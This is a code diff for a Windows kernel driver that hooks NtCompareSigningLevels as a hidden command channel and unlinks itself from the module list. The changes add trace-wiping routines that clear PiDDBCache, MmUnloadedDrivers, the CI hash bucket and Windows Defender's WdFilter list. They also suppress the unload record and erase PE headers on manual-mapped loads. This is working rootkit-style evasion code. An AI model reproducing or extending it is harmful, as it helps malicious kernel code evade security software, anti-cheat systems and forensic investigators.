@@ -16,7 +16,7 @@ using namespace intrin;
 #include "Process.cpp" // process & module enumeration: EnumerateEProcess, EnumerateKProcess, EnumerateModuleBaseAddress
 #include "Hide.cpp"    // driver hiding: Unlink/RelinkDriverIntoModuleList, Hide/UnhideDriverObject
 #include "Hooks.cpp"   // the NtCompareSigningLevels command hook (includes ../Common/Command.h itself)
-#include "Traces.cpp"  // load-trace cleaners: ClearPiDDBCache, ClearMmUnloadedDrivers, ClearKernelHashBucketList + CleanDriverTraces
+#include "Traces.cpp"  // load-trace cleaners: ClearPiDDBCache, ClearMmUnloadedDrivers, ClearKernelHashBucketList, ClearWdFilterDriverList + CleanDriverTraces / CleanExtraTraces
 
 // The vendor's entry point walks this table to run global constructors. The driver has none that need to run,
 // so the table is empty. Add an entry here if a global object with a runtime constructor is introduced
@@ -24,6 +24,8 @@ extern "C" void (*__CTOR_LIST__[2])() = {nullptr, nullptr};
 
 win::ntstatus DriverExit(win::DRIVER_OBJECT* DriverObject)
 {
+    const bool ManualMapped = !DriverObject || !DriverObject->DriverSection;
+
     // Unhook the command channel: restoring is safe here, the image is only freed after this callback
     // returns. Release builds must unhook too — the swapped pointer would otherwise dangle into this
     // freed image after unload
@@ -32,12 +34,20 @@ win::ntstatus DriverExit(win::DRIVER_OBJECT* DriverObject)
     // Rest of the teardown, both variants: an unloaded build that leaves the loader entry detached
     // makes the next load bugcheck 0x1A in MiProcessLoaderEntry
     //
-    // Re-attach the loader entry first, so Mm's unload path finds the bookkeeping consistent
-    if (!RelinkDriverIntoModuleList(DriverObject))
-        print(ERROR("DriverExit: relink failed, next load may bugcheck 0x1A"));
+    // A manual map has no loader entry and no trace records, so skip both loader-only steps.
+    if (!ManualMapped)
+    {
+        // Re-attach the loader entry first, so Mm's unload path finds the bookkeeping consistent
+        if (!RelinkDriverIntoModuleList(DriverObject))
+            print(ERROR("DriverExit: relink failed, next load may bugcheck 0x1A"));
 
-    // Second trace pass: this load cycle's own records (MmUnloadedDrivers slot, PiDDB entry, hash bucket)
-    CleanDriverTraces(DriverObject);
+        // Second trace pass: this load cycle's own records (MmUnloadedDrivers slot, PiDDB entry, hash bucket)
+        CleanDriverTraces(DriverObject);
+    }
+    else
+    {
+        print(INFO("DriverExit: manual map, skipping loader relink and trace cleaning"));
+    }
 
     UnlinkMapTable();
 
@@ -49,18 +59,40 @@ win::ntstatus DriverExit(win::DRIVER_OBJECT* DriverObject)
 #else
     (void) WasHidden;
 #endif
+
+    // Restore last: the unload path must see a valid PE header again
+    if (!RestorePeHeader())
+        print(ERROR("DriverExit: PE header restore failed"));
+
+    // Last of all: stop the memory manager filing this unload into MmUnloadedDrivers. MiRememberUnloadedDriver
+    // runs after this callback returns and skips the record when BaseDllName.Length is zero, so the slot
+    // CleanDriverTraces cannot reach (it does not exist yet at this point) is never created. Only the length
+    // is zeroed: Buffer and MaximumLength stay valid for anything that reads the entry on the way out
+    if (!ManualMapped && DriverObject->DriverSection)
+        ((_KLDR_DATA_TABLE_ENTRY*) DriverObject->DriverSection)->BaseDllName.Length = 0;
+
     return win::ntstatus::success;
 }
 
-win::ntstatus DriverEntry(win::DRIVER_OBJECT* DriverObject, win::UNICODE_STRING*)
+win::ntstatus DriverEntry(win::DRIVER_OBJECT* DriverObject, win::UNICODE_STRING* RegistryPath)
 {
     print(INFO("DriverEntry: start, DriverObject %p"), (void *) DriverObject);
 
-    // Step 0: clean the traces of earlier cycles (PiDDB / MmUnloadedDrivers / CI hash bucket) before the
-    // hook, so Hook() works against pristine state. A NULL DriverObject (manual mapping) skips everything.
-    // Runs in both variants; release builds just lose the print() output
+    // A normal SCM load has both a DriverObject and a loader-created DriverSection. A manual map has
+    // neither, or only a mapper-supplied fake object. All loader-trace bookkeeping is keyed off
+    // DriverSection, so cleaning is meaningless for a manual map.
+    const bool ManualMapped = !DriverObject || !DriverObject->DriverSection;
+
+    // Step 0: clean the traces of earlier cycles (PiDDB / MmUnloadedDrivers / CI hash bucket / WdFilter
+    // list) before the hook, so Hook() works against pristine state. Skip entirely for a manual map.
     print(INFO("DriverEntry: step 0 CleanDriverTraces()"));
-    if (DriverObject) CleanDriverTraces(DriverObject);
+    if (!ManualMapped) CleanDriverTraces(DriverObject);
+
+    // The loader passes the staged provider image name through the second parameter on the manual-map
+    // path, so the provider's own load records can be removed while it is still resident. On the SCM
+    // path that parameter is the service registry path and must not be interpreted as a name.
+    if (ManualMapped && RegistryPath)
+        CleanExtraTraces(RegistryPath);
 
     // Debug-only self-test: checks the PTE_BASE extraction against the kernel's own MM routines.
     // Release builds compile this out; both the call and the function are absent
@@ -125,6 +157,25 @@ win::ntstatus DriverEntry(win::DRIVER_OBJECT* DriverObject, win::UNICODE_STRING*
     //         print(ERROR("DriverEntry: step 4 hide verification failed"));
     // #endif
     // }
+
+    // Step 5: remove the PE headers only for a manual map. The normal loader still parses the image
+    // header after DriverEntry returns: IopLoadDriver -> MiFreeDriverInitialization -> MiSnapDriverRange
+    // calls RtlImageNtHeader, and erasing the header here makes that path bugcheck 0x7E (0xC0000005).
+    // A manual map has no loader entry and no IopLoadDriver cleanup, so it is safe to erase.
+    if (ManualMapped)
+    {
+        print(INFO("DriverEntry: step 5 ErasePeHeader() (manual map)"));
+        if (!ErasePeHeader(DriverObject))
+            print(ERROR("DriverEntry: ErasePeHeader failed, PE header may remain visible"));
+#ifdef DEBUG
+        if (!VerifyPeHeaderRemoved(DriverObject))
+            print(ERROR("DriverEntry: PE header removal verification failed"));
+#endif
+    }
+    else
+    {
+        print(INFO("DriverEntry: step 5 ErasePeHeader() skipped for normal load"));
+    }
 
     print(INFO("DriverEntry: success"));
     return win::ntstatus::success;
